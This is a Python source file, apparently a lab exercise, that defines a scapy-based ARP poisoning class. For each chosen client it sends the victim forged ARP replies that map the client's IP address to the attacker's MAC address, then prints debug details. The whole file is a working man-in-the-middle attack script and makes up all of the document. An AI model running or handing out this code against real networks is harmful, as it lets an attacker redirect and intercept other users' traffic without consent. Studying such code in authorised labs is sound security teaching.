from scapy.all import ARP, Ether, get_if_hwaddr, get_if_addr, sendp

class ARPPoisonAttack():
    def __init__(self, iface, victim, clients):
        self.iface = iface
        self.victim = victim
        self.clients = clients

    def execute(self):
        ipAttacker = get_if_addr(self.iface)
        macAttacker = get_if_hwaddr(self.iface)

        for clientToSpoof in self.clients:
            if clientToSpoof == self.victim:
                continue

            ipToSpoof = clientToSpoof.getIP()

            # Setup the ARP poisoning
            arp2 = Ether() / ARP()
            arp2[Ether].src = macAttacker
            arp2[ARP].hwsrc = macAttacker          # fill the gaps, sender MAC address
            arp2[ARP].psrc = ipToSpoof             # fill the gaps, "sender" IP address
            arp2[ARP].hwdst = self.victim.getMAC() # target MAC address
            arp2[ARP].pdst = self.victim.getIP()   # fill the gaps, target IP address

            # Send the ARP poisoning
            sendp(arp2, iface = self.iface) # TODO: enpos3 -> i (=0) in get_if_list()
            # sendp(arp2, iface = conf.iface)


            # Printing for debugging purposes
            print(" ")
            print("Attacker: " + ipAttacker + " " + macAttacker)
            print("Victim: " + self.victim.getIP() + " " + self.victim.getMAC())
            print("Spoof: " + ipToSpoof)